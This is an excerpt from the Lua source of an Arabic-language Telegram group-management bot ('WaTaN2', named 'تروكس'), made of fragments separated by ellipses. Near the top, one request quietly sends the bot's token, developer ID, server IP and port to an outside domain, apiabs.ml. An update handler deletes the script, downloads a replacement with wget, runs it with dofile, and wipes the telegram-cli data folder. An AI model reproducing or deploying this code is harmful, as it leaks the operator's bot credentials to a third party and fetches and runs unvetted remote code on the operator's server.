...
https.request("https://apiabs.ml/Api/WaTaN2/index.php?Get=WaTaN2&DevId="..DevAbs:get(Server.."IdWaTaN2").."&TokenBot="..DevAbs:get(Server.."TokenWaTaN2").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
...
NameBot = (DevAbs:get(WaTaN2..'Abs:NameBot') or 'تروكس')
--     Source WaTaN2     --
...
if text and text:match('^'..(DevAbs:get(WaTaN2..'Abs:NameBot') or "تروكس")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevAbs:get(WaTaN2..'Abs:NameBot') or "تروكس")..' ','')
end
...
{{text="✯ السورس .",url="https://t.me/WaTaNTeaM"},{text="✯ لتنصيب بوت .",url="https://t.me/EEEEEl"}},{{text="✯ اضفني في مجموعتك .",url="t.me/"..dpbot.username_.."?startgroup=botstart"}}
}
...
local BotName = (DevAbs:get(WaTaN2.."Abs:NameBot") or 'تروكس')
...
if text and text == (DevAbs:get(WaTaN2..'Abs:NameBot') or 'تروكس') then 
NameBot = (DevAbs:get(WaTaN2..'Abs:NameBot') or 'تروكس')
...
Dev_Abs(msg.chat_id_, msg.id_, 1, '✯︙جاري تحديث سورس تروكس', 1, 'md') 
os.execute('rm -rf WaTaN2.lua') 
os.execute('wget https://raw.githubusercontent.com/WaTaNTeaM/WaTaN2/main/WaTaN2.lua') 
dofile('WaTaN2.lua') 
io.popen("rm -rf ../.telegram-cli/*")
...
DevAbs:set(WaTaN2..'Abs:NameBot',(DevAbs:get(WaTaN2..'Name:Bot') or 'تروكس'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
